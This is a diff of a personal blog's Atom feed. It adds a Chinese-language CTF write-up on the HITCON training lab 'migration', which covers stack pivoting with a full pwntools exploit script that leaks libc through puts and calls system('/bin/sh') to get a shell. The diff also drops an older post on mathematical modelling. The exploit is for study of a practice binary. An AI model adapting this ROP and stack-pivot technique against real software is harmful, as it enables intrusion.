@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.yof3ng.xyz/"/>
-  <updated>2018-10-24T10:06:33.500Z</updated>
+  <updated>2018-10-25T09:11:40.527Z</updated>
   <id>http://www.yof3ng.xyz/</id>
   
   <author>
@@ -15,6 +15,36 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Pwn-10月25-Hitcon(三)</title>
+    <link href="http://www.yof3ng.xyz/2018/10/25/Pwn-10%E6%9C%8825-Hitcon-%E4%B8%89/"/>
+    <id>http://www.yof3ng.xyz/2018/10/25/Pwn-10月25-Hitcon-三/</id>
+    <published>2018-10-25T00:54:34.000Z</published>
+    <updated>2018-10-25T09:11:40.527Z</updated>
+    
+    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月25-Hitcon-三"><a href="#Pwn-10月25-Hitcon-三" class="headerlink" title="Pwn-10月25-Hitcon(三)"></a>Pwn-10月25-Hitcon(三)</h1><blockquote><p>一天一天慢慢来，😭</p></blockquote><h2 id="lab6-migration"><a href="#lab6-migration" class="headerlink" title="lab6-migration"></a>lab6-migration</h2><blockquote><p>这个题目涉及到栈迁移(stack-pivot)，在<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others/#stack-pivoting" target="_blank" rel="noopener">ctf-wiki</a>上面是有这个例题和解释的。</p><blockquote><p>该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting</p><ul><li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li><li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li><li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li></ul><p>此外，利用 stack pivoting 有以下几个要求:</p><ul><li>可以控制程序执行流。</li><li>可以控制 sp 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是</li></ul><pre class=" language-assembly"><code class="language-assembly">pop rsp/esp</code></pre></blockquote><p>在这题中，溢出长度不够导致无法一次性构造ropchain，并且还限制了main函数溢出的次数。</p></blockquote><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec migration</code></p><p><img src="https://i.loli.net/2018/10/25/5bd172b663166.png" alt=""></p><p>开启了NX。</p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>ida 里面看一看：</p><p><img src="https://i.loli.net/2018/10/25/5bd1738bc3bfe.png" alt=""></p><p>buf大小为0x28 = 40字节，而read读取0x40 = 64字节</p><p>gdb跑一下，看看具体情况：</p><p><img src="https://i.loli.net/2018/10/25/5bd17674836d1.png" alt=""></p><p>也就是说有4个字节被读取到EBP中，剩下20个溢出字节可以用来构造ropchain。</p><p>搜索一下可用的gadget：</p><p><img src="https://i.loli.net/2018/10/25/5bd18186ce41f.png" alt=""></p></blockquote><h3 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h3><p>exp：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-S</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./migration'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./migration"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>system_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"system_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system_libc<span class="token punctuation">)</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"read_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>puts_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_libc<span class="token punctuation">)</span>binsh_libc<span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"binsh_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>binsh_libc<span class="token punctuation">)</span>leave_ret <span class="token operator">=</span> <span class="token number">0x08048418</span>p3ret <span class="token operator">=</span> <span class="token number">0x08048569</span> <span class="token comment" spellcheck="true">#pop esi ; pop edi ; pop ebp ; ret</span>p1ret <span class="token operator">=</span> <span class="token number">0x0804836d</span> <span class="token comment" spellcheck="true">#pop_ebp_ret</span>buf1 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x500</span>buf2 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x400</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span>payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" :\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>p1ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"puts_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>offset <span class="token operator">=</span> puts_addr <span class="token operator">-</span> puts_libcsystem_addr <span class="token operator">=</span> system_libc <span class="token operator">+</span> offsetbinsh <span class="token operator">=</span> binsh_libc <span class="token operator">+</span>offset<span class="token triple-quoted-string string">'''payload =p32(buf1)+p32(read_plt)+p32(p3ret)+p32(0)+p32(buf1)+p32(0x100)+p32(system_addr)+p32(0xdeadbeef)+p32(buf1)p.send(payload)sleep(0.1)#p.send("/bin/sh\0")p.interactive()'''</span>payload <span class="token operator">=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"bbbb"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>exp运行效果：<img src="https://i.loli.net/2018/10/25/5bd17a3f8c896.png" alt=""></p><blockquote><p>这题伪造假栈帧，从而构造ropchain，简直就是一场消化盛宴，我需要好好消化一下lab6。</p><p>今天还看了一下安恒一周年特别赛的一道pwn题–over，做一半发现只能控制ebp和eip？？？没想到是安恒杯六月赛的一道原题，在ctf-wiki的花式栈溢出技巧里面有，并且和lab6一样也是通过控制ebp和eip来做，但是那题并没有多出来的溢出字节。</p><p>总的来说，两种都可以称作伪造假栈帧：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/others/#_6" target="_blank" rel="noopener">CTF-WIKI-花式栈溢出</a>。</p></blockquote>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;[TOC]&lt;/p&gt;
+&lt;h1 id=&quot;Pwn-10月25-Hitcon-三&quot;&gt;&lt;a href=&quot;#Pwn-10月25-Hitcon-三&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10月25-Hitcon(三)&quot;&gt;&lt;/a&gt;Pwn-10月25-Hitcon(三
+      
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
+    
+    
+      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
+    
+      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
+    
+      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>Pwn-10月24-hitcon(二)</title>
@@ -218,9 +248,9 @@
     
       <category term="算法" scheme="http://www.yof3ng.xyz/tags/%E7%AE%97%E6%B3%95/"/>
     
-      <category term="algorithm" scheme="http://www.yof3ng.xyz/tags/algorithm/"/>
-    
       <category term="数学建模" scheme="http://www.yof3ng.xyz/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
+    
+      <category term="algorithm" scheme="http://www.yof3ng.xyz/tags/algorithm/"/>
     
   </entry>
   
@@ -549,32 +579,6 @@
       
         &lt;p&gt;[TOC]&lt;/p&gt;
 &lt;h1 id=&quot;数学建模-day2-–-matlab-基本用法&quot;&gt;&lt;a href=&quot;#数学建模-day2-–-matlab-基本用法&quot; class=&quot;headerlink&quot; title=&quot;数学建模_day2 – matlab 基本用法&quot;&gt;&lt;/a&gt;数学建模
-      
-    
-    </summary>
-    
-      <category term="数学建模" scheme="http://www.yof3ng.xyz/categories/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
-    
-    
-      <category term="数模" scheme="http://www.yof3ng.xyz/tags/%E6%95%B0%E6%A8%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>数学建模_day1</title>
-    <link href="http://www.yof3ng.xyz/2018/10/06/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day1/"/>
-    <id>http://www.yof3ng.xyz/2018/10/06/数学建模-day1/</id>
-    <published>2018-10-06T14:40:06.000Z</published>
-    <updated>2018-10-07T05:54:53.284Z</updated>
-    
-    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="数学建模-day1–初入数模"><a href="#数学建模-day1–初入数模" class="headerlink" title="数学建模_day1–初入数模"></a>数学建模_day1–初入数模</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; 作为一个大二刚开始的学生才真正接触数模，虽然有点晚了，但我相信有付出，就有回报，没有付出就没有馅饼😄。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 数学建模是什么东西呢？简单来说就是通过数学的符号和语言作表述来建立数学模型，而此数学模型首先是根据实际问题建立的，通过这个建立的数学模型，我们可以去解决一个实际的问题，如共享单车，城市排污等等问题。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 数学建模的过程包括表述，求解，解释，检验四个过程。可细分为七个步骤：模型准备，模型假设，模型构成，模型求解，模型分析，模型检验，模型应用。</p><h3 id="1-模型准备"><a href="#1-模型准备" class="headerlink" title="1.模型准备"></a>1.模型准备</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 作为建模的第一步，我们首先应该了解给出的那个问题的实际背景，再明确建模的目的，从而可以针对性地搜集有关的信息，掌握模型对象的特征之后，在我们脑海中形成一个比较清晰的问题。比如共享单车的投放问题，面对这个问题我们首先就知道了需要得出一个合理的投放量，那么我们就需要从多方面来获取信息，如各地人口数量，交通情况，以及基础设施完善程度等等信息，来丰富这个模型的特征，进而建立出合理的模型来解决共享单车的投放问题。<br><img src="https://i.loli.net/2018/10/06/5bb8d2dd91a08.png" alt=""></p><h3 id="2-模型假设"><a href="#2-模型假设" class="headerlink" title="2.模型假设"></a>2.模型假设</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 在模型假设这一步中，很明显你建立出来的模型是否合理取决于它的可用性，针对问题的特点和建模目的，要做出最合理的模型假设，怎么个合理法呢？那就是要符合实际情况，如物质成本，时间成本，空间成本等等条件。<br><img src="https://i.loli.net/2018/10/06/5bb8d3068e279.png" alt=""></p><h3 id="3-模型构成"><a href="#3-模型构成" class="headerlink" title="3.模型构成"></a>3.模型构成</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 模型的构成就需要我们好好讲究了，正所谓讲究而不将就，如何在实际情况与构成难度之间做出最合适的表达也是一门艺术。这一步我们需要尽量采用简单普遍的数学工具来构成模型。<br><img src="https://i.loli.net/2018/10/06/5bb8d31f817e6.png" alt=""></p><h3 id="4-模型求解"><a href="#4-模型求解" class="headerlink" title="4.模型求解"></a>4.模型求解</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 通过各种数学方法，软件（matlab，mathematical，lingo），以及计算机编程技术，来对模型进行高效率地求解。</p><h3 id="5-模型分析"><a href="#5-模型分析" class="headerlink" title="5.模型分析"></a>5.模型分析</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 对求出来的结果进行误差分析，统计分析，以及模型对数据的稳定性分析（机器学习也有涉及：1. 计算的稳定性(Computational Stability)；2. 数据稳定性；3. 性能的稳定性 [参考链接]: <a href="https://blog.csdn.net/zhouwenyuan1015/article/details/78228818）" target="_blank" rel="noopener">https://blog.csdn.net/zhouwenyuan1015/article/details/78228818）</a></p><h3 id="6-模型检验"><a href="#6-模型检验" class="headerlink" title="6.模型检验"></a>6.模型检验</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 数学讲究一个严谨，因而在模型求解之后进行检验那是必然的。我们需要将解出来的数据与实际现象，现实数据比较，从而检验模型的合理性。</p><h3 id="7-模型应用"><a href="#7-模型应用" class="headerlink" title="7.模型应用"></a>7.模型应用</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 当模型能够得到应用时，说明这是个成熟的模型了，该学会自己解决问题了（脑补 成熟的模型.jpg😄)。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;[TOC]&lt;/p&gt;
-&lt;h1 id=&quot;数学建模-day1–初入数模&quot;&gt;&lt;a href=&quot;#数学建模-day1–初入数模&quot; class=&quot;headerlink&quot; title=&quot;数学建模_day1–初入数模&quot;&gt;&lt;/a&gt;数学建模_day1–初入数模&lt;/h1&gt;&lt;p&gt;&amp;nbsp; &amp;n
       
     
     </summary>
